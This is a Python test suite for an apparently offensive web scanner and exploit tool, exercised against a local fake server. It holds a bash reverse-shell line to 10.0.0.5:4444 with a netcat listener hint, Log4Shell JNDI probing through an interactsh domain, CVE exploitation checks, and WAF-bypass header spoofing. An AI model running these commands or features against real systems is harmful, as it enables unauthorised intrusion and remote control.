#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Test fitur lanjutan: Log4Shell, CVE suite, --plugins, PoC headers, severity."""

import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from zqrya_exploit import core
from tests._server import FakeQ, FakeServer, read_request, respond


class TestLog4shell(unittest.TestCase):
    def test_requires_domain(self):
        srv = FakeServer(lambda conn: respond(conn, 200, b"ok"))
        q = FakeQ()
        try:
            core.scan_log4j(srv.url + "/", core.make_session(), q, domain=None)
            self.assertTrue(any("oob-domain" in line for line in q.lines))
        finally:
            srv.stop()

    def test_payload_sent_to_headers_and_params(self):
        recorded = []

        def handler(conn):
            method, path, headers, body = read_request(conn)
            recorded.append((dict(headers), path))
            respond(conn, 200, b"ok")

        srv = FakeServer(handler)
        q = FakeQ()
        try:
            core.scan_log4j(srv.url + "/login", core.make_session(), q,
                            domain="x.interactsh.com")
            self.assertTrue(any("jndi" in str(h) for h, _ in recorded))
        finally:
            srv.stop()


class TestCve(unittest.TestCase):
    def test_confluence_ognl_eval(self):
        def handler(conn):
            method, path, headers, body = read_request(conn)
            if "233" in path:
                respond(conn, 200, b"54289")
            else:
                respond(conn, 200, b"ok")

        srv = FakeServer(handler)
        q = FakeQ()
        try:
            core.scan_cve(srv.url + "/login.action", core.make_session(), q)
            self.assertIn("confluence-cve-2022-26134", q.finding_types())
        finally:
            srv.stop()

    def test_weblogic_console_bypass(self):
        def handler(conn):
            method, path, headers, body = read_request(conn)
            if "console.portal" in path:
                respond(conn, 200, b"Oracle WebLogic Server Console")
            else:
                respond(conn, 404, b"not found")

        srv = FakeServer(handler)
        q = FakeQ()
        try:
            core.scan_cve(srv.url + "/", core.make_session(), q)
            self.assertIn("weblogic-cve-2020-14882", q.finding_types())
        finally:
            srv.stop()

    def test_jenkins_script_console(self):
        def handler(conn):
            method, path, headers, body = read_request(conn)
            if "/script" in path:
                respond(conn, 200, b"Jenkins Script Console")
            else:
                respond(conn, 404, b"not found")

        srv = FakeServer(handler)
        q = FakeQ()
        try:
            core.scan_cve(srv.url + "/", core.make_session(), q)
            self.assertIn("jenkins-script-console", q.finding_types())
        finally:
            srv.stop()


class TestRunPlugins(unittest.TestCase):
    def test_fingerprint_only(self):
        def handler(conn):
            method, path, headers, body = read_request(conn)
            respond(conn, 200, b"ok", {"Server": "nginx/1.18"})

        srv = FakeServer(handler)
        q = FakeQ()
        try:
            core.run_plugins(["fingerprint"], srv.url + "/", core.make_session(), q)
            self.assertIn("fingerprint", q.finding_types())
            self.assertNotIn("xss", q.finding_types())
            self.assertNotIn("sqli", q.finding_types())
        finally:
            srv.stop()


class TestPocHeaders(unittest.TestCase):
    def test_rule_sends_custom_headers(self):
        def handler(conn):
            method, path, headers, body = read_request(conn)
            if headers.get("x-zqrya") == "yes":
                respond(conn, 200, b"header-received")
            else:
                respond(conn, 200, b"no")

        srv = FakeServer(handler)
        q = FakeQ()
        poc = {
            "name": "header-test",
            "severity": "high",
            "rules": [{
                "method": "GET",
                "path": "/",
                "headers": {"X-Zqrya": "yes"},
                "expression": 'response.status == 200 && response.body.contains("header-received")',
            }],
        }
        try:
            self.assertTrue(core.run_poc(poc, srv.url, core.make_session(), q))
            self.assertIn("poc-header-test", q.finding_types())
        finally:
            srv.stop()


class TestBundledPocs(unittest.TestCase):
    def test_default_poc_dir_runs(self):
        def handler(conn):
            method, path, headers, body = read_request(conn)
            if path.startswith("/.git/config"):
                respond(conn, 200, b"[core]\n\tbare = false\n")
            elif path.startswith("/actuator/env"):
                respond(conn, 200, b'{"java.version":"1.8"}')
            else:
                respond(conn, 404, b"not found")

        srv = FakeServer(handler)
        q = FakeQ()
        try:
            core.scan_pocs(srv.url, core.make_session(), q)
            self.assertIn("poc-git-config-exposed", q.finding_types())
            self.assertIn("poc-springboot-actuator-exposed", q.finding_types())
        finally:
            srv.stop()


class TestBundledPocVariety(unittest.TestCase):
    def test_apache_cve_poc(self):
        def handler(conn):
            method, path, headers, body = read_request(conn)
            if "passwd" in path:
                respond(conn, 200, b"root:x:0:0:root:/root:/bin/bash\n")
            else:
                respond(conn, 404, b"not found")

        srv = FakeServer(handler)
        q = FakeQ()
        try:
            poc = core._load_poc(os.path.join(core.bundled_resource("pocs"),
                                              "apache-cve-2021-41773.json"))
            self.assertTrue(core.run_poc(poc, srv.url, core.make_session(), q))
            self.assertIn("poc-apache-cve-2021-41773", q.finding_types())
        finally:
            srv.stop()


class TestRadarTemplates(unittest.TestCase):
    def test_bundled_templates_present(self):
        here = os.path.dirname(os.path.abspath(core.__file__))
        bundled = os.path.join(here, "tools", "radar-templates")
        self.assertTrue(os.path.isdir(bundled))
        yamls = []
        for root, _dirs, files in os.walk(bundled):
            for f in files:
                if f.endswith(".yaml"):
                    yamls.append(os.path.join(root, f))
        self.assertGreaterEqual(len(yamls), 40)

    def test_templates_dir_resolves(self):
        # Dengan bundel bawaan, _radar_templates_dir() harus selalu ketemu
        # direktori templates (meski tanpa ~/radar-templates).
        tdir = core._radar_templates_dir()
        self.assertIsNotNone(tdir)
        self.assertTrue(os.path.isdir(tdir))


class TestRunExternalStreaming(unittest.TestCase):
    def test_streams_lines_incrementally(self):
        import tempfile
        import time as _time
        script = tempfile.NamedTemporaryFile("w", suffix=".py", delete=False)
        script.write(
            "import sys, time\n"
            "print('first', flush=True)\n"
            "time.sleep(0.4)\n"
            "print('second', flush=True)\n"
        )
        script.close()

        events = []

        class Recorder:
            def put(self, msg):
                events.append((_time.time(), msg))

        q = Recorder()
        orig = core.find_tool
        core.find_tool = lambda name: script.name
        try:
            core.run_external("faketool", [], q)
        finally:
            core.find_tool = orig
            os.unlink(script.name)

        msgs = [m for _t, m in events if "first" in m or "second" in m]
        self.assertIn("first", msgs[0])
        self.assertIn("second", msgs[-1])
        # first di-log sebelum proses selesai (gap >= 0.3s => streaming, bukan buffer)
        first_t = next(t for t, m in events if "first" in m)
        second_t = next(t for t, m in events if "second" in m)
        self.assertGreaterEqual(second_t - first_t, 0.3)

    def test_strip_ansi_for_gui(self):
        dirty = "\x1b[2K:: Progress: [1/1] \x1b[0m\x1b[?25l"
        self.assertEqual(core._strip_ansi(dirty), ":: Progress: [1/1] ")
        self.assertEqual(core._strip_ansi("plain"), "plain")
        self.assertEqual(core._strip_ansi("\x1b]0;title\x07done"), "done")

    def test_strip_ansi_cr_backspace_ctrl(self):
        # carriage return dihilangkan
        self.assertEqual(core._strip_ansi("line\rCR-clean"), "lineCR-clean")
        # backspace menghapus karakter sebelumnya (progress gaya \b)
        self.assertEqual(core._strip_ansi("spin a\b\b\bb"), "spin b")
        # karakter kontrol C0 (bell/formfeed/NUL) dibuang, TAB & LF dipertahankan
        self.assertEqual(core._strip_ansi("ctrl\x07bell\x0cform\x00nul"),
                         "ctrlbellformnul")
        self.assertEqual(core._strip_ansi("tab\there\nnewline"), "tab\there\nnewline")

    def test_cprint_flushes_for_cli_stream(self):
        # _cprint (sink CLI) harus flush agar output stream tool eksternal
        # muncul live meski stdout bukan TTY (di-pipe/redirect).
        import io
        buf = io.StringIO()
        flushed = []

        class TrackingStdout:
            def write(self, s):
                buf.write(s)
            def flush(self):
                flushed.append(True)
            def isatty(self):
                return False

        old = sys.stdout
        sys.stdout = TrackingStdout()
        try:
            core._cprint("hello stream")
        finally:
            sys.stdout = old
        self.assertTrue(flushed)
        self.assertIn("hello stream", buf.getvalue())

    def test_stop_external_kills_process(self):
        import tempfile
        import threading
        import time as _time
        script = tempfile.NamedTemporaryFile("w", suffix=".py", delete=False)
        script.write(
            "import sys, time\n"
            "for i in range(100):\n"
            "    print('tick', i, flush=True)\n"
            "    time.sleep(0.2)\n"
        )
        script.close()

        class Recorder:
            def __init__(self):
                self.lines = []
            def put(self, msg):
                self.lines.append(msg)

        q = Recorder()
        orig = core.find_tool
        core.find_tool = lambda name: script.name
        try:
            t = threading.Thread(
                target=lambda: core.run_external("faketool", [], q), daemon=True)
            t.start()
            # tunggu proses terdaftar di registry aktif
            deadline = _time.time() + 3
            while core._ACTIVE_PROC is None and _time.time() < deadline:
                _time.sleep(0.05)
            self.assertIsNotNone(core._ACTIVE_PROC)
            self.assertTrue(core.stop_external())
            t.join(timeout=5)
            self.assertFalse(t.is_alive())
            self.assertFalse(core.stop_external())
        finally:
            core.find_tool = orig
            os.unlink(script.name)

        ticks = [m for m in q.lines if "tick" in m]
        self.assertLess(len(ticks), 100)


class TestDownloadRadarTemplates(unittest.TestCase):
    def test_repo_url_set(self):
        self.assertIn("nuclei-templates", core.RADAR_TEMPLATES_REPO)

    def test_fallback_graceful_on_network_failure(self):
        import tempfile
        from unittest import mock
        target = tempfile.mkdtemp() + "-templates"
        with mock.patch.object(core, "find_tool", return_value=None), \
             mock.patch("urllib.request.urlretrieve",
                        side_effect=OSError("no net")):
            ok = core.download_radar_templates(q=FakeQ(), target_dir=target)
        self.assertFalse(ok)

    def test_primary_path_uses_radar_updater(self):
        # Bila tool radar tersedia, updater bawaan dipanggil dulu.
        from unittest import mock
        calls = []
        fake_bin = "/tmp/fake-radar"
        with mock.patch.object(core, "find_tool", return_value=fake_bin), \
             mock.patch.object(core, "run_external",
                               side_effect=lambda *a, **k: calls.append(a)), \
             mock.patch("urllib.request.urlretrieve",
                        side_effect=OSError("no net")):
            core.download_radar_templates(q=FakeQ(),
                                          target_dir="/tmp/zq-tpl-test")
        self.assertTrue(calls)
        self.assertEqual(calls[0][0], "radar")
        self.assertIn("-update-templates", calls[0][1])

    def test_merge_bundled_templates_idempotent(self):
        import shutil
        import tempfile
        target = tempfile.mkdtemp()
        try:
            n1 = core._merge_bundled_templates(target)
            dst = os.path.join(target, "zqrya-bundled")
            self.assertGreaterEqual(n1, 40)
            self.assertTrue(os.path.isdir(dst))
            yamls = []
            for root, _dirs, files in os.walk(dst):
                yamls += [f for f in files if f.endswith((".yaml", ".yml"))]
            self.assertGreaterEqual(len(yamls), 40)
            # idempotent: merge kedua tidak menyalin ulang
            n2 = core._merge_bundled_templates(target)
            self.assertEqual(n2, 0)
        finally:
            shutil.rmtree(target, ignore_errors=True)

    def test_download_radar_templates_merges_bundled(self):
        import tempfile
        from unittest import mock
        target = tempfile.mkdtemp() + "/radar-templates"

        def fake_run_external(tool, args, q):
            # simulasi updater berhasil: buat target + satu template "penuh"
            os.makedirs(target, exist_ok=True)
            with open(os.path.join(target, "full-template.yaml"), "w") as f:
                f.write("id: full\ninfo:\n  name: full\n  severity: info\n")

        with mock.patch.object(core, "find_tool", return_value="/tmp/fake-radar"), \
             mock.patch.object(core, "run_external", side_effect=fake_run_external):
            ok = core.download_radar_templates(q=FakeQ(), target_dir=target)

        self.assertTrue(ok)
        self.assertTrue(os.path.isdir(os.path.join(target, "zqrya-bundled")))


class TestCveRshellDialog(unittest.TestCase):
    def test_reverse_shells_cover_requested_types(self):
        for t in ("bash", "python", "nc"):
            self.assertIn(t, core.REVERSE_SHELLS)

    def test_rshell_command_build(self):
        cmd = core.REVERSE_SHELLS["bash"].replace(
            "{LHOST}", "10.0.0.5").replace("{LPORT}", "4444")
        self.assertIn("10.0.0.5", cmd)
        self.assertIn("4444", cmd)

    def test_cve_exploit_bg_rshell_path(self):
        import inspect
        from unittest import mock
        sig = inspect.signature(core.App._cve_exploit_bg)
        self.assertIn("rshell", sig.parameters)
        self.assertIn("lhost", sig.parameters)
        self.assertIn("lport", sig.parameters)

        captured = {}

        class FakeApp:
            q = FakeQ()
            session = object()
            def _log_exc(self, e):
                raise e

        app = FakeApp()
        rshell_cmd = "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
        with mock.patch.object(core, "exploit_cve_cmd",
                               side_effect=lambda cve, url, cmd, s, q:
                               captured.update(cmd=cmd) or "ok"):
            core.App._cve_exploit_bg(app, "http://x", "f5-cve-2022-1388",
                                     rshell_cmd, rshell=True, shell_type="bash",
                                     lhost="10.0.0.5", lport=4444)
        self.assertEqual(captured["cmd"], rshell_cmd)
        joined = "\n".join(str(x) for x in app.q.lines)
        self.assertIn("nc -lvnp 4444", joined)


class TestRadarFilters(unittest.TestCase):
    def test_constants_defined(self):
        self.assertTrue(core.RADAR_SEVERITIES)
        self.assertTrue(core.RADAR_COMMON_TAGS)
        self.assertIn("critical", core.RADAR_SEVERITIES)
        self.assertIn("critical", core.RADAR_DEFAULT_SEVERITIES)

    def test_args_with_all_filters(self):
        a = core.radar_scan_args(
            "http://x/", "/tmp/tpl", "high,critical", "cve,rce", "intrusive")
        self.assertEqual(a[:3], ["-u", "http://x/", "-silent"])
        self.assertIn("-t", a)
        self.assertEqual(a[a.index("-t") + 1], "/tmp/tpl")
        self.assertEqual(a[a.index("-severity") + 1], "high,critical")
        self.assertEqual(a[a.index("-tags") + 1], "cve,rce")
        self.assertEqual(a[a.index("-etags") + 1], "intrusive")

    def test_args_without_optional_filters(self):
        a = core.radar_scan_args("http://x/", None, None, None, None)
        self.assertEqual(a, ["-u", "http://x/", "-silent"])

    def test_category_constants(self):
        self.assertTrue(core.RADAR_CATEGORIES)
        self.assertTrue(core.RADAR_CATEGORY_LABELS)
        self.assertEqual(core.RADAR_CATEGORIES["misconfig"], "misconfiguration")
        self.assertEqual(core.RADAR_CATEGORIES["admin"], "admin-panels")
        self.assertEqual(core.RADAR_CATEGORIES["tech"], "technologies")

    def test_category_paths_resolves_subfolders(self):
        import tempfile
        root = tempfile.mkdtemp()
        try:
            os.makedirs(os.path.join(root, "cves"))
            os.makedirs(os.path.join(root, "cms"))
            os.makedirs(os.path.join(root, "exposures"))
            p = core.radar_category_paths(root, ["cves", "cms"])
            parts = p.split(",")
            self.assertEqual(len(parts), 2)
            self.assertTrue(parts[0].endswith(os.path.join("cves")))
            self.assertTrue(parts[1].endswith(os.path.join("cms")))
            # folder yang tidak ada di tdir di-resolve fallback ke bundel bawaan
            p2 = core.radar_category_paths(root, ["cves", "admin"])
            parts2 = p2.split(",")
            self.assertEqual(len(parts2), 2)
            self.assertTrue(parts2[0].endswith(os.path.join("cves")))
            self.assertTrue(parts2[1].endswith(os.path.join("admin-panels")))
        finally:
            import shutil
            shutil.rmtree(root, ignore_errors=True)

    def test_category_paths_empty(self):
        self.assertIsNone(core.radar_category_paths(None, ["cves"]))
        self.assertIsNone(core.radar_category_paths("/tmp/x", None))
        self.assertIsNone(core.radar_category_paths("/tmp/x", []))

    def test_parse_radar_categories(self):
        self.assertEqual(core.parse_radar_categories("cves, cms"), ["cves", "cms"])
        self.assertEqual(core.parse_radar_categories("cves,bogus"), ["cves"])
        self.assertIsNone(core.parse_radar_categories(""))
        self.assertIsNone(core.parse_radar_categories("bogus"))
        self.assertIsNone(core.parse_radar_categories(None))

    def test_parse_radar_categories_full_nuclei(self):
        self.assertEqual(core.parse_radar_categories("http/cves,dns,ssl"),
                         ["http/cves", "dns", "ssl"])
        self.assertEqual(core.parse_radar_categories("cves,http/exposures"),
                         ["cves", "http/exposures"])
        self.assertEqual(core.parse_radar_categories("http/cves,bogus"),
                         ["http/cves"])

    def test_category_paths_full_nuclei_structure(self):
        import shutil
        import tempfile
        root = tempfile.mkdtemp()
        try:
            os.makedirs(os.path.join(root, "http", "cves"))
            os.makedirs(os.path.join(root, "dns"))
            os.makedirs(os.path.join(root, "ssl"))
            p = core.radar_category_paths(root, ["http/cves", "dns"])
            parts = p.split(",")
            self.assertEqual(len(parts), 2)
            self.assertTrue(parts[0].endswith(os.path.join("http", "cves")))
            self.assertTrue(parts[1].endswith(os.path.join("dns")))
        finally:
            shutil.rmtree(root, ignore_errors=True)

    def test_category_paths_returns_none_for_missing_full_nuclei(self):
        import shutil
        import tempfile
        root = tempfile.mkdtemp()
        try:
            os.makedirs(os.path.join(root, "cms"))
            # Kategori full-nuclei yang tidak ada di disk maupun bundel -> None
            # (dulu ini bikin radar jalan tanpa -t dan tidak ada fallback).
            self.assertIsNone(core.radar_category_paths(root, ["http/cves", "dns"]))
            # Campur: kategori yang ada di disk tetap di-resolve.
            p = core.radar_category_paths(root, ["cms", "http/cves"])
            self.assertIsNotNone(p)
            self.assertTrue(p.endswith(os.path.join("cms")))
        finally:
            shutil.rmtree(root, ignore_errors=True)

    def test_available_categories_autodetect(self):
        import shutil
        import tempfile
        root = tempfile.mkdtemp()
        try:
            os.makedirs(os.path.join(root, "http", "cves"))
            os.makedirs(os.path.join(root, "http", "exposures"))
            os.makedirs(os.path.join(root, "dns"))
            os.makedirs(os.path.join(root, "ssl"))
            cats = core.radar_available_categories(root)
            for c in ("http/cves", "http/exposures", "dns", "ssl",
                      "cves", "cms"):  # key bundel selalu ada
                self.assertIn(c, cats)
            # kategori fiktif tidak terdeteksi
            self.assertNotIn("http/random-xyz", cats)
            # parse dengan set terdeteksi
            known = set(cats)
            self.assertEqual(core.parse_radar_categories("dns,http/cves", known),
                             ["dns", "http/cves"])
            self.assertIsNone(core.parse_radar_categories("http/random-xyz", known))
        finally:
            shutil.rmtree(root, ignore_errors=True)


class TestAllInOne(unittest.TestCase):
    def test_runs_all_steps_and_isolates_failure(self):
        from unittest import mock
        specs = [{"url": "http://x", "params": [("cmd", "x")]}]
        mocks = {}
        patchers = []
        for name in ("scan_baseline", "scan_fingerprint", "scan_all_vulns",
                     "scan_ssrf", "scan_xxe", "scan_oob", "scan_upload",
                     "scan_smuggling", "scan_brute_force", "scan_pocs",
                     "scan_frameworks", "scan_directory", "auto_exploit_cve",
                     "auto_exploit"):
            m = mock.MagicMock()
            mocks[name] = m
            p = mock.patch.object(core, name, m)
            p.start()
            patchers.append(p)

        crawl = mock.MagicMock(return_value=specs)
        p = mock.patch.object(core, "crawl_forms", crawl)
        p.start()
        patchers.append(p)

        # satu langkah gagal — pipeline harus tetap lanjut ke langkah lain
        mocks["scan_upload"].side_effect = RuntimeError("boom")

        try:
            core.run_all_in_one("http://x", object(), FakeQ(), encode="none")
        finally:
            for p in patchers:
                p.stop()

        self.assertTrue(crawl.called)
        for name, m in mocks.items():
            self.assertTrue(m.called, "%s harus dipanggil" % name)

    def test_skips_exploit_when_disabled(self):
        from unittest import mock
        patchers = []
        for name in ("crawl_forms", "scan_baseline", "scan_fingerprint",
                     "scan_all_vulns", "scan_ssrf", "scan_xxe", "scan_oob",
                     "scan_upload", "scan_smuggling", "scan_brute_force",
                     "scan_pocs", "scan_frameworks", "scan_directory"):
            patchers.append(mock.patch.object(core, name, mock.MagicMock()))
        expl_cve = mock.MagicMock()
        expl_param = mock.MagicMock()
        patchers.append(mock.patch.object(core, "auto_exploit_cve", expl_cve))
        patchers.append(mock.patch.object(core, "auto_exploit", expl_param))
        for p in patchers:
            p.start()
        try:
            core.run_all_in_one("http://x", object(), FakeQ(),
                                encode="none", auto_exploit_rce=False)
        finally:
            for p in patchers:
                p.stop()
        self.assertFalse(expl_cve.called)
        self.assertFalse(expl_param.called)

    def test_on_progress_callback_and_percent(self):
        from unittest import mock
        specs = [{"url": "http://x", "params": [("cmd", "x")]}]
        patchers = []
        for name in ("scan_baseline", "scan_fingerprint", "scan_all_vulns",
                     "scan_ssrf", "scan_xxe", "scan_oob", "scan_upload",
                     "scan_smuggling", "scan_brute_force", "scan_pocs",
                     "scan_frameworks", "scan_directory", "auto_exploit_cve",
                     "auto_exploit"):
            patchers.append(mock.patch.object(core, name, mock.MagicMock()))
        patchers.append(mock.patch.object(core, "crawl_forms",
                                          mock.MagicMock(return_value=specs)))
        for p in patchers:
            p.start()
        progress = []
        q = FakeQ()
        try:
            core.run_all_in_one("http://x", object(), q, encode="none",
                                on_progress=progress.append)
        finally:
            for p in patchers:
                p.stop()
        self.assertTrue(progress)
        self.assertEqual(progress[-1], 100)
        self.assertEqual(progress, sorted(progress))
        self.assertTrue(any("(7%)" in str(l) for l in q.lines))
        self.assertTrue(any("(100%)" in str(l) for l in q.lines))


class TestWafFingerprint(unittest.TestCase):
    def test_detect_cloudflare_header(self):
        hits = core.detect_waf({"Server": "cloudflare", "CF-RAY": "x"}, "")
        self.assertEqual([n for n, _, _ in hits], ["Cloudflare"])

    def test_detect_akamai_cookie(self):
        hits = core.detect_waf({"Set-Cookie": "ak_bmsc=1; _abck=2"}, "")
        self.assertEqual([n for n, _, _ in hits], ["Akamai"])

    def test_detect_cloudfront_header(self):
        hits = core.detect_waf({"X-Cache": "Hit from cloudfront"}, "")
        self.assertEqual([n for n, _, _ in hits], ["AWS CloudFront"])

    def test_detect_modsecurity_body(self):
        hits = core.detect_waf({}, "This error was generated by Mod_Security")
        self.assertEqual([n for n, _, _ in hits], ["ModSecurity"])

    def test_no_waf(self):
        self.assertEqual(core.detect_waf({"Server": "nginx"}, "hello"), [])

    def test_rules_have_bypass_hints(self):
        self.assertTrue(len(core.WAF_FINGERPRINTS) >= 20)
        for name, kind, matches, bypass in core.WAF_FINGERPRINTS:
            self.assertTrue(name, "nama tidak kosong")
            self.assertTrue(kind, "jenis tidak kosong: %s" % name)
            self.assertTrue(matches, "matches tidak kosong: %s" % name)
            self.assertTrue(bypass, "bypass tidak kosong: %s" % name)

    def test_scan_waf_end_to_end(self):
        def handler(conn):
            respond(conn, 200, b"ok", headers={"Server": "cloudflare",
                                               "CF-Ray": "abc123"})
        srv = FakeServer(handler)
        q = FakeQ()
        try:
            hits = core.scan_waf(srv.url + "/", core.make_session(), q)
        finally:
            srv.stop()
        self.assertIn("Cloudflare", hits)
        self.assertTrue(any("Cloudflare" in str(l) for l in q.lines))
        self.assertIn("waf-cdn", q.finding_types())
        self.assertTrue(any("-> " in str(l) for l in q.lines))


class TestWafHeaders(unittest.TestCase):
    def tearDown(self):
        core.disable_waf_headers()

    def test_enable_disable(self):
        core.enable_waf_headers(aggressive=False)
        self.assertIn("X-Forwarded-For", core.ACTIVE_WAF_HEADERS)
        self.assertNotIn("X-Original-URL", core.ACTIVE_WAF_HEADERS)
        core.enable_waf_headers(aggressive=True)
        self.assertIn("X-Original-URL", core.ACTIVE_WAF_HEADERS)
        self.assertIn("X-HTTP-Method-Override", core.ACTIVE_WAF_HEADERS)
        core.disable_waf_headers()
        self.assertEqual(core.ACTIVE_WAF_HEADERS, {})

    def test_rotation(self):
        core.enable_waf_headers()
        s = core.make_session()
        seen = set()
        for _ in range(len(core._WAF_IP_POOL) + 1):
            core._apply_waf_headers(s)
            seen.add(s.headers["X-Forwarded-For"])
        self.assertGreater(len(seen), 1)

    def test_http_request_sends_headers(self):
        recorded = {}

        def handler(conn):
            method, path, headers, body = read_request(conn)
            recorded.update(headers)
            respond(conn, 200, b"ok")

        srv = FakeServer(handler)
        core.enable_waf_headers(aggressive=True)
        try:
            session = core.make_session()
            core.http_request("GET", srv.url + "/", None, session)
        finally:
            srv.stop()
            core.disable_waf_headers()
        self.assertIn("x-forwarded-for", recorded)
        self.assertEqual(recorded.get("x-original-url"), "/")
        self.assertEqual(recorded.get("x-real-ip"), "127.0.0.1")


class TestHttpDebug(unittest.TestCase):
    def tearDown(self):
        core.set_http_debug(False)

    def test_short_truncates(self):
        self.assertEqual(core._short("abc"), "abc")
        self.assertEqual(core._short(None), "")
        self.assertEqual(core._short("x" * 500), "x" * 300 + "...(500 chars)")

    def test_debug_sink_receives_request_and_response(self):
        lines = []
        core.set_http_debug(True, sink=lines.append)

        def handler(conn):
            respond(conn, 200, b"ok")

        srv = FakeServer(handler)
        try:
            core.http_request("GET", srv.url + "/", None, core.make_session())
        finally:
            srv.stop()
            core.set_http_debug(False)
        self.assertTrue(any(l.startswith("[HTTP] >> GET") for l in lines))
        self.assertTrue(any(l.startswith("[HTTP] << 200") for l in lines))


class TestCliAllInOne(unittest.TestCase):
    def _run(self, argv, mock_run):
        from unittest import mock
        saved_argv = sys.argv
        try:
            sys.argv = argv
            with mock.patch.object(core, "_print_banner", lambda: None), \
                 mock.patch.object(core, "_cprint", lambda *a, **k: None), \
                 mock.patch.object(core, "run_all_in_one", mock_run):
                core.run_cli()
        finally:
            sys.argv = saved_argv

    def test_mode_all_in_one_dispatches(self):
        from unittest import mock
        m = mock.MagicMock()
        self._run(["zqrya", "--cli", "http://x/", "--mode", "all-in-one"], m)
        m.assert_called_once()
        args, kwargs = m.call_args
        self.assertEqual(args[0], "http://x/")
        self.assertTrue(kwargs.get("auto_exploit_rce"))

    def test_all_in_one_flag_sets_mode(self):
        from unittest import mock
        m = mock.MagicMock()
        self._run(["zqrya", "--cli", "http://x/", "--all-in-one"], m)
        m.assert_called_once()
        self.assertEqual(m.call_args[0][0], "http://x/")

    def test_waf_flag_sets_tamper_all(self):
        from unittest import mock
        saved_argv = sys.argv
        saved_tamper = core.REQUEST_TAMPER
        saved_waf_headers = dict(core.ACTIVE_WAF_HEADERS)
        try:
            sys.argv = ["zqrya", "--cli", "http://x/", "--waf"]
            mocks = {}
            for name in ("scan_waf", "scan_all_vulns", "scan_directory",
                         "scan_backup_files", "scan_baseline", "scan_fingerprint"):
                mocks[name] = mock.MagicMock()
            patchers = [mock.patch.object(core, "_print_banner", lambda: None),
                        mock.patch.object(core, "_cprint", lambda *a, **k: None),
                        mock.patch.object(core, "crawl_forms",
                                          mock.MagicMock(return_value=[]))]
            for name, m in mocks.items():
                patchers.append(mock.patch.object(core, name, m))
            for p in patchers:
                p.start()
            try:
                core.run_cli()
            finally:
                for p in patchers:
                    p.stop()
            self.assertEqual(core.REQUEST_TAMPER, "all")
            mocks["scan_waf"].assert_called_once()
        finally:
            sys.argv = saved_argv
            core.REQUEST_TAMPER = saved_tamper
            core.ACTIVE_WAF_HEADERS = saved_waf_headers


class TestSeveritySummary(unittest.TestCase):
    def test_counts_by_severity(self):
        r = core.Report("http://x")
        r.add_finding("a", "d", "high")
        r.add_finding("b", "d", "high")
        r.add_finding("c", "d", "low")
        self.assertEqual(r.severity_summary(), {"high": 2, "low": 1})
        self.assertIn("severity", r.to_json())


if __name__ == "__main__":
    unittest.main()
